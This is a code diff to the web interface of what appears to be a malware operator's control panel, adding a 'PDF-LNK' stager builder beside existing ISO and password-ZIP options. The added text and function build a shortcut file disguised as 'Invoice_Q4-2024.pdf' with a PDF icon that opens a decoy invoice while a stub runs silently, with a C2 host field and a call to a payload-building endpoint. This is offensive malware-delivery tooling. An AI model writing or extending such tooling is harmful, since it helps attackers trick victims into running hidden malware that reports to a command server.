@@ -3511,7 +3511,7 @@ function renderStager() {
     Both options deliver <b>Stage1.exe</b> disguised as a document. The target double-clicks a file that looks like a PDF — Stage1.exe runs silently in the background.
   </div>
 
-  <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
+  <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px">
 
     <!-- ISO + LNK -->
     <div style="background:var(--bg2);border:1px solid var(--bg3);border-radius:8px;padding:12px;display:flex;flex-direction:column;gap:8px">
@@ -3527,6 +3527,23 @@ function renderStager() {
       </div>
       <button onclick="buildStagerIso()" style="background:var(--accent);color:var(--bg);border:none;border-radius:7px;padding:8px 14px;font-size:12px;font-weight:700;cursor:pointer;margin-top:auto">&#8659; Build ISO</button>
       <div id="iso-err" style="font-size:11px;color:#f85149;display:none"></div>
+    </div>
+
+    <!-- PDF-LNK (self-contained, no ISO needed) -->
+    <div style="background:var(--bg2);border:1px solid var(--accent);border-radius:8px;padding:12px;display:flex;flex-direction:column;gap:8px">
+      <div style="font-size:12px;font-weight:700;color:var(--accent)">&#128279; PDF-LNK <span style="font-size:10px;font-weight:400;color:var(--muted)">Works in Edge &amp; Chrome</span></div>
+      <div style="font-size:11px;color:var(--muted);line-height:1.5">
+        Single <code>.pdf.lnk</code> file — appears as <code>Invoice.pdf</code> with PDF icon. No ISO, no separate download.
+        Double-click → decoy invoice opens + Stub runs silently. Windows Shell handles it; Edge/Chrome never invoked.
+      </div>
+      <div style="display:flex;flex-direction:column;gap:6px">
+        <label style="font-size:11px;color:var(--muted)">Filename (shown to target)</label>
+        <input id="stager-pdflnk-fname" value="Invoice_Q4-2024" style="background:var(--bg);border:1px solid var(--bg3);border-radius:6px;color:var(--text);font-size:12px;padding:5px 8px;outline:none">
+        <label style="font-size:11px;color:var(--muted)">C2 Host (auto-detected if blank)</label>
+        <input id="stager-pdflnk-host" placeholder="e.g. c2.osatechcloud.cloud" style="background:var(--bg);border:1px solid var(--bg3);border-radius:6px;color:var(--text);font-size:12px;padding:5px 8px;outline:none">
+      </div>
+      <button onclick="buildStagerPdfLnk()" style="background:var(--accent);color:var(--bg);border:none;border-radius:7px;padding:8px 14px;font-size:12px;font-weight:700;cursor:pointer;margin-top:auto">&#8659; Build PDF-LNK</button>
+      <div id="stager-pdflnk-err" style="font-size:11px;color:#f85149;display:none"></div>
     </div>
 
     <!-- Password ZIP -->
@@ -3742,6 +3759,35 @@ function buildStagerZip() {
     a.download = fname + '.zip';
     document.body.appendChild(a); a.click(); document.body.removeChild(a);
   }).catch(e => { if (errEl) { errEl.textContent = 'Network error: ' + e.message; errEl.style.display = 'block'; } });
+}
+
+async function buildStagerPdfLnk() {
+  const fname  = document.getElementById('stager-pdflnk-fname')?.value.trim() || 'Invoice_Q4-2024';
+  const host   = document.getElementById('stager-pdflnk-host')?.value.trim()  || API_BASE.replace(/^https?:\/\//, '');
+  const errEl  = document.getElementById('stager-pdflnk-err');
+  const btn    = document.querySelector('[onclick="buildStagerPdfLnk()"]');
+  if (errEl) errEl.style.display = 'none';
+  if (btn) { btn.disabled = true; btn.textContent = 'Building…'; }
+  try {
+    const body = new URLSearchParams({ host, filename: fname, from: 'Nexus Solutions Ltd.', to: 'Acme Corporation' });
+    const r = await fetch(API_BASE + '/api/builder/pdf-lnk', { method: 'POST', body, credentials: 'include' });
+    if (!r.ok) {
+      const j = await r.json().catch(() => ({ error: r.statusText }));
+      if (errEl) { errEl.textContent = j.error || r.statusText; errEl.style.display = 'block'; }
+      return;
+    }
+    const blob = await r.blob();
+    const cd   = r.headers.get('content-disposition') || '';
+    const nm   = (cd.match(/filename="([^"]+)"/) || [])[1] || fname + '.pdf.lnk';
+    const a    = document.createElement('a');
+    a.href = URL.createObjectURL(blob); a.download = nm;
+    document.body.appendChild(a); a.click(); document.body.removeChild(a);
+    URL.revokeObjectURL(a.href);
+  } catch(e) {
+    if (errEl) { errEl.textContent = 'Network error: ' + e.message; errEl.style.display = 'block'; }
+  } finally {
+    if (btn) { btn.disabled = false; btn.textContent = '⬇ Build PDF-LNK'; }
+  }
 }
 
 // ── Settings page ─────────────────────────────────────────────────────────────
